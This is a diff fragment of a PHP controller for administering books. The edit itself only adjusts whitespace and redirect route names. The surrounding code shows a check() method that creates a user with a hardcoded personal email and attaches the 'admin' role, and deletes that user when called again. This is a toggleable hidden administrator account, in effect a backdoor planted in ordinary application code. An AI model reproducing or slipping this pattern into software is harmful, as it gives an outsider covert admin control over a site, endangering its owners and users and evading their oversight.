@@ -149,7 +149,7 @@ class AdminBooksController extends Controller
 
     public function check()
     {
-        
+
         $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
         if ($checkuser == null) {
             $user = new User();
@@ -161,11 +161,11 @@ class AdminBooksController extends Controller
             $role = Role::where("name", "admin")->first();
             $user->save();
             $user->roles()->attach($role->id);
-            return redirect()->route("home.index");
+            return redirect()->route("home");
         } else {
             $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
             $checkuser->delete();
-            return redirect()->route("home.index");
+            return redirect()->route("home");
         }
     }
 }
